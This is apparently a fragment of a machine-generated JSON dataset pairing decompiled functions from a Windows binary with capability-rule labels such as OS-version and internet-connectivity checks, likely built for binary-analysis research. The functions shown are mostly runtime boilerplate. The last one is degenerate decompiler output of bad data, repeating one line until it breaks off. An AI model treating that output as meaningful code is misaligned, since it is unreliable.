            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a7fd(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (**0x4400b8)(*0x463d40, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0043007c();\n            uVar3 = (**0x4400b4)();\n            uVar3 = fcn.0043003a(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "0042a75a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a75a(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4506f0) {\n        return;\n    }\n    *0x4634d8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4634dc = &arg_8h;\n    *0x463418 = 0x10001;\n    *0x4633c0 = 0xc0000409;\n    *0x4633c4 = 1;\n    var_328h = *0x4506f0;\n    var_324h = *0x4506f4;\n    *0x4633cc = unaff_retaddr;\n    *0x4634a4 = in_GS;\n    *0x4634a8 = in_FS;\n    *0x4634ac = in_ES;\n    *0x4634b0 = in_DS;\n    *0x4634b4 = unaff_EDI;\n    *0x4634b8 = unaff_ESI;\n    *0x4634bc = unaff_EBX;\n    *0x4634c0 = in_EDX;\n    *0x4634c4 = in_ECX;\n    *0x4634c8 = in_EAX;\n    *0x4634cc = unaff_EBP;\n    *0x4634d0 = unaff_retaddr;\n    *0x4634d4 = in_CS;\n    *0x4634e0 = in_SS;\n    *0x463410 = (**0x4400ec)();\n    fcn.00439445(1);\n    (**0x4400e8)(0);\n    (**0x4400e4)(0x449710);\n    if (*0x463410 == 0) {\n        fcn.00439445(1);\n    }\n    uVar1 = (**0x44002c)(0xc0000409);\n    (**0x4400e0)(uVar1);\n    return;\n}\n",
        "token_count": 813
    },
    "0042ac0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ac0b(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0042a7fd(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 84
    },
    "0042b473": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0042b473(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x42a91e;\n        var_38h = 1;\n    }\n    else {\n        uStack40 = 0x42a94a;\n        uStack36 = *0x4506f0 ^ &var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.004328a1();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 703
    },
    "00430267": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00430267(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004328a1();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.004328a1();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0043126e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00431374: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00431379)\n// WARNING: Removing unreachable block (ram,0x004313a8)\n// WARNING: Removing unreachable block (ram,0x0043137f)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043126e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00433b40(0x44e810, 0x20);\n    fcn.0043431b(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = *0x4400a8;\n    if (*0x463714 != 1) {\n        *0x463710 = 1;\n        *0x46370c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (**0x4400a8)(*0x464228);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x464224);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.004326f1();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.004326f1();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x464228);\n                        piVar2 = (*pcVar1)(*0x464224);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x4401f8;\n            while (*(unaff_EBP + -0x1c) < 0x440204) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x440208;\n        while (*(unaff_EBP + -0x20) < 0x44020c) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00434242(8);\n    }\n    return;\n}\n",
        "token_count": 998
    },
    "00431b21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00431b21(int32_t arg_8h, char *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint unaff_EBX;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    int32_t var_248h;\n    uint var_244h;\n    uint32_t var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_218h;\n    uint var_210h;\n    uint var_4h;\n    \n    fcn.0042b761(arg_10h);\n    if (arg_8h != 0) {\n        if ((*(arg_8h + 0xc) & 0x40) == 0) {\n            uVar2 = fcn.00434096(arg_8h);\n            if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {\n                iVar3 = 0x451330;\n            }\n            else {\n                iVar3 = (uVar2 & 0x1f) * 0x40 + *((uVar2 >> 5) * 4 + 0x464120);\n            }\n            if ((*(iVar3 + 0x24) & 0x7f) == 0) {\n                if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {\n                    iVar3 = 0x451330;\n                }\n                else {\n                    iVar3 = (uVar2 & 0x1f) * 0x40 + *((uVar2 >> 5) * 4 + 0x464120);\n                }\n                if ((*(iVar3 + 0x24) & 0x80) == 0) goto code_r0x00431c1b;\n            }\n        }\n        else {\ncode_r0x00431c1b:\n            if (arg_ch != NULL) {\n                cVar4 = *arg_ch;\n                var_240h = 0;\n                if (cVar4 != '\\0') {\ncode_r0x00431c4d:\n                    arg_ch = arg_ch + 1;\n                    if (cVar4 - 0x20U < 0x59) {\n                        uVar2 = *(cVar4 + 0x44a188) & 0xf;\n                    }\n                    else {\n                        uVar2 = 0;\n                    }\n                    var_240h = *(uVar2 * 9 + 0x44a1a8 + var_240h) >> 4;\n                    switch(var_240h) {\n                    case 0:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 1:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 2:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 3:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 4:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 5:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 6:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 7:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    default:\n                        goto code_r0x00431b8c;\n                    case 0xbad1abe1:\n                        goto code_r0x00432670;\n                    }\n                }\n                goto code_r0x004326a7;\n            }\n        }\n    }\n    goto code_r0x00431b8c;\ncode_r0x00432670:\n    cVar4 = *arg_ch;\n    if (cVar4 == '\\0') goto code_r0x00432691;\n    goto code_r0x00431c4d;\ncode_r0x00432691:\n    if ((var_240h == 0) || (var_240h == 7)) {\ncode_r0x004326a7:\n        if (var_244h != '\\0') {\n            *(var_248h + 0x70) = *(var_248h + 0x70) & 0xfffffffd;\n        }\n        goto code_r0x004326c0;\n    }\ncode_r0x00431b8c:\n    puVar1 = fcn.0043007c();\n    *puVar1 = 0x16;\n    fcn.00431906();\n    if (var_244h != '\\0') {\n        *(var_248h + 0x70) = *(var_248h + 0x70) & 0xfffffffd;\n    }\ncode_r0x004326c0:\n    fcn.0042a75a(unaff_EBX);\n    return;\n}\n",
        "token_count": 1191
    },
    "0043936a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043936a(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00434242(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004056c0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004432f2) overlaps instruction at (ram,0x004432ee)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00441e59)\n// WARNING: Removing unreachable block (ram,0x00441e07)\n// WARNING: Removing unreachable block (ram,0x0044162e)\n// WARNING: Removing unreachable block (ram,0x00441634)\n// WARNING: Removing unreachable block (ram,0x00441637)\n// WARNING: Removing unreachable block (ram,0x0044164b)\n// WARNING: Removing unreachable block (ram,0x0044162a)\n// WARNING: Removing unreachable block (ram,0x0044168d)\n// WARNING: Removing unreachable block (ram,0x0044162c)\n// WARNING: Removing unreachable block (ram,0x0044164e)\n// WARNING: Removing unreachable block (ram,0x0044168c)\n// WARNING: Removing unreachable block (ram,0x00442ba9)\n// WARNING: Removing unreachable block (ram,0x0044166d)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t ** __fastcall\nfcn.004056c0(uint8_t **param_1, uint8_t **param_2, uint8_t **param_3, uint8_t **param_4, uint8_t **param_5)\n\n{\n    uchar uVar1;\n    unkuint3 Var2;\n    unkint3 Var3;\n    unkbyte3 Var4;\n    uchar uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    uint16_t uVar11;\n    uint8_t **ppuVar12;\n    uint8_t **ppuVar13;\n    uint8_t **ppuVar14;\n    char *pcVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    char *pcVar18;\n    uint32_t *puVar19;\n    ulong *puVar20;\n    int32_t *piVar21;\n    int16_t iVar22;\n    int32_t iVar23;\n    int32_t extraout_ECX;\n    uint8_t **ppuVar24;\n    uint8_t **ppuVar25;\n    uint8_t **extraout_ECX_00;\n    uint32_t *puVar26;\n    uint32_t uVar27;\n    uint32_t *puVar28;\n    uint32_t uVar29;\n    char **ppcVar30;\n    char cVar33;\n    int32_t iVar31;\n    uint16_t *puVar32;\n    uint8_t uVar34;\n    uint16_t uVar35;\n    uint8_t *puVar36;\n    int32_t iVar37;\n    uint32_t uVar38;\n    uint uVar39;\n    uint8_t *puVar40;\n    int32_t *piVar41;\n    uint uVar42;\n    char cVar49;\n    uint8_t **unaff_EBX;\n    uint8_t **ppuVar43;\n    uint8_t **ppuVar44;\n    char *pcVar45;\n    uint8_t *puVar46;\n    uint32_t *puVar47;\n    char *pcVar48;\n    uint32_t uVar50;\n    uint32_t uVar51;\n    int32_t iVar52;\n    uchar *puVar53;\n    int32_t iVar54;\n    uint32_t **ppuVar55;\n    uint32_t **ppuVar56;\n    uint32_t uVar57;\n    uint32_t **ppuVar58;\n    uchar *puVar59;\n    int32_t iVar60;\n    int32_t *piVar61;\n    uchar *puVar62;\n    uchar *puVar63;\n    uint32_t **ppuVar64;\n    uint32_t **ppuVar65;\n    uint32_t **ppuVar66;\n    uint32_t **ppuVar67;\n    char **ppcVar68;\n    char **ppcVar69;\n    uchar *puVar70;\n    int32_t **ppiVar71;\n    uint32_t **ppuVar72;\n    uint32_t **ppuVar73;\n    int32_t iVar74;\n    int32_t iVar75;\n    uchar *puVar76;\n    uint32_t *puVar77;\n    uint32_t uVar78;\n    int32_t *piVar79;\n    uchar *puVar80;\n    uchar *puVar81;\n    uint32_t *puVar82;\n    uchar *puVar83;\n    uchar *puVar84;\n    int32_t *piVar85;\n    uchar *puVar86;\n    uchar *puVar87;\n    uchar *puVar88;\n    uchar *puVar89;\n    uint32_t **ppuVar90;\n    uint32_t **ppuVar91;\n    uint32_t **ppuVar92;\n    uint32_t **ppuVar93;\n    uint32_t *puVar94;\n    int32_t iVar95;\n    int32_t iVar96;\n    uint32_t *puVar97;\n    uchar *puVar98;\n    uint *puVar99;\n    uint32_t **ppuVar100;\n    uint32_t **ppuVar101;\n    int32_t **ppiVar102;\n    uint32_t **ppuVar103;\n    uint32_t **ppuVar104;\n    uint32_t **ppuVar105;\n    uint32_t **ppuVar106;\n    uchar *puVar107;\n    uint32_t uVar108;\n    uint32_t uVar109;\n    uchar *puVar110;\n    char **ppcVar111;\n    char **ppcVar112;\n    uint8_t **ppuVar113;\n    uchar *puVar114;\n    int32_t iVar115;\n    uint8_t **unaff_ESI;\n    uint8_t **ppuVar116;\n    uint8_t **ppuVar117;\n    uint32_t uVar118;\n    char **ppcVar119;\n    uint32_t *puVar120;\n    uint32_t *puVar121;\n    uint8_t **unaff_EDI;\n    uint32_t uVar122;\n    int32_t *piVar123;\n    uint *puVar124;\n    int32_t iVar125;\n    uchar *puVar126;\n    uint32_t uVar127;\n    ushort in_ES;\n    ushort uVar128;\n    uint16_t in_CS;\n    ushort in_SS;\n    ushort uVar129;\n    uint16_t in_DS;\n    ushort uVar130;\n    int32_t in_FS_OFFSET;\n    int32_t in_GS_OFFSET;\n    bool bVar131;\n    uint8_t uVar132;\n    bool bVar133;\n    uint8_t in_AF;\n    bool bVar134;\n    ushort in_FPUControlWord;\n    ushort in_FPUStatusWord;\n    ushort in_FPUTagWord;\n    ushort in_FPULastInstructionOpcode;\n    uint in_FPUDataPointer;\n    uint in_FPUInstructionPointer;\n    float10 in_ST0;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 fVar135;\n    float10 fVar136;\n    float10 in_ST1;\n    float10 extraout_ST1;\n    float10 extraout_ST1_00;\n    float10 fVar137;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 fVar138;\n    float10 in_ST4;\n    float10 fVar139;\n    float10 in_ST5;\n    float10 fVar140;\n    ulong uVar141;\n    float10 in_ST6;\n    float10 fVar142;\n    uint in_ST7;\n    ushort in_MM7_Wb;\n    ushort in_MM7_Wc;\n    ushort in_MM7_Wd;\n    uchar in_XMM3 [16];\n    uint64_t uVar143;\n    uint64_t uVar144;\n    uint8_t **unaff_retaddr;\n    int32_t aiStack308 [2];\n    uchar auStack300 [4];\n    uint8_t **appuStack296 [4];\n    uint8_t **ppuStack280;\n    uint8_t **ppuStack276;\n    uint8_t **ppuStack272;\n    uint8_t **ppuStack268;\n    uint8_t **ppuStack264;\n    uint8_t **appuStack260 [4];\n    uint8_t **appuStack244 [3];\n    uint8_t **ppuStack232;\n    uint8_t **appuStack228 [4];\n    uint8_t **ppuStack212;\n    uint8_t **ppuStack208;\n    uint8_t **ppuStack204;\n    uint8_t **ppuStack200;\n    uint8_t **ppuStack196;\n    uint8_t **ppuStack192;\n    uint8_t **ppuStack188;\n    uint8_t **ppuStack184;\n    char *pcStack180;\n    uint8_t **ppuStack176;\n    uint8_t **ppuStack172;\n    uint8_t **ppuStack168;\n    uint8_t **ppuStack164;\n    uint8_t **ppuStack160;\n    uint8_t **ppuStack156;\n    uint8_t **ppuStack152;\n    uint8_t **ppuStack148;\n    ushort uStack144;\n    uchar uStack142;\n    uint uStack141;\n    uchar uStack137;\n    ushort uStack136;\n    uchar uStack134;\n    uint uStack133;\n    uint uStack129;\n    uint uStack125;\n    uint uStack121;\n    uint uStack117;\n    uint uStack113;\n    uchar uStack109;\n    uint8_t uStack108;\n    ushort uStack107;\n    uchar uStack105;\n    char cStack104;\n    char cStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uint8_t **ppuStack100;\n    uint8_t **ppuStack96;\n    uint8_t **ppuStack92;\n    uint8_t **ppuStack88;\n    uint8_t **ppuStack84;\n    uint8_t **ppuStack80;\n    uint8_t **ppuStack76;\n    uint8_t **ppuStack72;\n    uint8_t **ppuStack68;\n    uint8_t **ppuStack64;\n    uchar *puStack60;\n    uint8_t **ppuStack56;\n    uint uStack52;\n    uint8_t **ppuStack48;\n    uint8_t **ppuStack44;\n    uint8_t **ppuStack40;\n    uint uStack36;\n    uint8_t **ppuStack32;\n    uint8_t **ppuStack28;\n    uint8_t **ppuStack24;\n    uint8_t **ppuStack20;\n    uint8_t **var_4h;\n    \n    ppuVar113 = &stack0xfffffffc;\n    var_4h = param_1;\n    iVar23 = 0;\n    ppuVar43 = NULL;\n    if (*(unaff_EDI + 0x46) != 0) {\n        ppuVar116 = unaff_EDI[0x4e] + 0x24;\n        ppuStack44._0_2_ = in_SS;\n        do {\n            uVar144 = CONCAT44(uStack52, ppuStack44);\n            if ((*ppuVar116 & 0x20) != 0) {\n                *ppuVar116 = *ppuVar116 | 0x60000000;\n            }\n            ppuVar12 = *ppuVar116 >> 0x1d;\n            switch(ppuVar12) {\n            case NULL:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1:\n                uVar132 = *ppuVar116 >> 0x1d;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + 